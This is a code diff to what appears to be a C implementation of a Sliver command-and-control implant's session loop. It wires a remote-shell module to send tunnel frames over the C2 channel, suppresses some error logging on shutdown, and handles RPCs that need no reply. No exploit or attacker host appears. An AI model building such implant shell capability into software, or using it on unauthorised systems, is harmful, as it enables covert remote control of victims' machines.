@@ -64,7 +64,9 @@ static int send_envelope(session_tx_t *tx, const void *envelope, size_t len) {
     sliver_mutex_lock(tx->tx_lock);
   }
   if (sliver_yamux_open(tx->y, &sid) != 0) {
-    LOG_ERROR("session: yamux open failed");
+    if (!tx->stop && !tx->y->failed) {
+      LOG_ERROR("session: yamux open failed");
+    }
     if (tx->tx_lock != NULL) {
       sliver_mutex_unlock(tx->tx_lock);
     }
@@ -88,6 +90,26 @@ static int encode_unknown_reply(sliver_buf_t *out, int64_t id) {
     return -1;
   }
   return sliver_buf_put_bool(out, 4, 1);
+}
+
+/* Lets the shell module push TunnelData frames through the same sender. */
+static session_tx_t *g_tx = NULL;
+
+static int shell_send_adapter(uint32_t type, const void *data, size_t len) {
+  sliver_buf_t env;
+  int rc;
+
+  if (g_tx == NULL) {
+    return -1;
+  }
+  sliver_buf_init(&env);
+  if (sliver_envelope_encode(&env, 0, type, data, len) != 0) {
+    sliver_buf_free(&env);
+    return -1;
+  }
+  rc = send_envelope(g_tx, env.data, env.len);
+  sliver_buf_free(&env);
+  return rc;
 }
 
 /* Heartbeat: keeps NAT bindings alive and lets the server notice a dead peer. */
@@ -174,6 +196,8 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   tx.signer = &signer;
   tx.tx_lock = tx_lock;
   tx.stop = 0;
+  g_tx = &tx;
+  sliver_shell_set_sender(shell_send_adapter);
 
   /* Register: Envelope{Type = MsgRegister, Data = Register}. */
   reg = cfg->reg;
@@ -231,7 +255,9 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
       LOG_DEBUG("session: ping from server (nonce %d)", nonce);
     } else {
       sliver_rpc_dispatch(&envelope, &result);
-      if (result.handled) {
+      if (result.no_response) {
+        sliver_rpc_result_free(&result);
+      } else if (result.handled) {
         sliver_buf_t reply;
         sliver_buf_init(&reply);
         if (sliver_envelope_encode(&reply, envelope.id, result.resp_type,
@@ -265,6 +291,8 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
 
 out:
   tx.stop = 1;
+  sliver_shell_shutdown();
+  g_tx = NULL;
   if (heartbeat != NULL) {
     (void)sliver_thread_join(heartbeat);
     heartbeat = NULL;
